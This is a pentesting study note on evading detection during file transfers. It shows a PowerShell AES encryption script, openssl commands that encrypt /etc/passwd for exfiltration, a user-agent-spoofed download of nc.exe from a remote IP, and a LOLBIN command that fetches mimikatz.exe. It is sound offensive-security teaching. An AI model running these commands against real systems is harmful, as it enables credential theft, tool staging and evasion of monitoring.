---
title: Evading detection in file transfers
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - evading detection
  - exploitation
  - file transfer technique
  - backdoors
---
# Evading detection in file transfers

Encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit.

## File Encryption on Windows: Invoke-AESEncryption.ps1

Download it from: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1 Also, see the code snippet below.

```powershell
<#  
.SYNOPSIS  
Encryptes or Decrypts Strings or Byte-Arrays with AES  
   
.DESCRIPTION  
Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)  
   
.PARAMETER Mode  
Encryption or Decryption Mode  
   
.PARAMETER Key  
Key used to encrypt or decrypt  
   
.PARAMETER Text  
String value to encrypt or decrypt  
   
.PARAMETER Path  
Filepath for file to encrypt or decrypt  
   
.EXAMPLE  
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"  
   
Description  
-----------  
Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text.  
   
.EXAMPLE  
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="  
   
Description  
-----------  
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.  
   
.EXAMPLE  
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin  
   
Description  
-----------  
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"  
   
.EXAMPLE  
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes  
   
Description  
-----------  
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"  
#>  
function Invoke-AESEncryption {  
    [CmdletBinding()]  
    [OutputType([string])]  
    Param  
    (  
        [Parameter(Mandatory = $true)]  
        [ValidateSet('Encrypt', 'Decrypt')]  
        [String]$Mode,  
  
        [Parameter(Mandatory = $true)]  
        [String]$Key,  
  
        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]  
        [String]$Text,  
  
        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]  
        [String]$Path  
    )  
  
    Begin {  
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed  
        $aesManaged = New-Object System.Security.Cryptography.AesManaged  
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC  
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros  
        $aesManaged.BlockSize = 128  
        $aesManaged.KeySize = 256  
    }  
  
    Process {  
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))  
  
        switch ($Mode) {  
            'Encrypt' {  
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}  
                  
                if ($Path) {  
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue  
                    if (!$File.FullName) {  
                        Write-Error -Message "File not found!"  
                        break  
                    }  
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)  
                    $outPath = $File.FullName + ".aes"  
                }  
  
                $encryptor = $aesManaged.CreateEncryptor()  
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)  
                $encryptedBytes = $aesManaged.IV + $encryptedBytes  
                $aesManaged.Dispose()  
  
                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}  
                  
                if ($Path) {  
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)  
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime  
                    return "File encrypted to $outPath"  
                }  
            }  
  
            'Decrypt' {  
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}  
                  
                if ($Path) {  
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue  
                    if (!$File.FullName) {  
                        Write-Error -Message "File not found!"  
                        break  
                    }  
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)  
                    $outPath = $File.FullName -replace ".aes"  
                }  
  
                $aesManaged.IV = $cipherBytes[0..15]  
                $decryptor = $aesManaged.CreateDecryptor()  
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)  
                $aesManaged.Dispose()  
  
                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}  
                  
                if ($Path) {  
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)  
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime  
                    return "File decrypted to $outPath"  
                }  
            }  
        }  
    }  
  
    End {  
        $shaManaged.Dispose()  
        $aesManaged.Dispose()  
    }  
}
```

After the script has been transferred, it only needs to be imported as a module, as shown below.

```powershell-session
Import-Module .\Invoke-AESEncryption.ps1
```

This command creates an encrypted file with the same name as the encrypted file but with the extension "`.aes`."

```powershell-session
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```


## File Encryption on Linux: 

### Encrypting /etc/passwd with openssl

```shell-session
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

**Decrypt passwd.enc with openssl**

```shell-session
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```


## Changing User Agent

**Request with Invoke-WebRequest and Chrome User agent**

Listing user agents: 

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

```txt
Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```


Using Chrome User Agent:

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```

```shell-session
nc -lvnp 80
```


## LOLBAS / GTFOBins

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```


Such a binary might be permitted to run by application whitelisting and be excluded from alerting.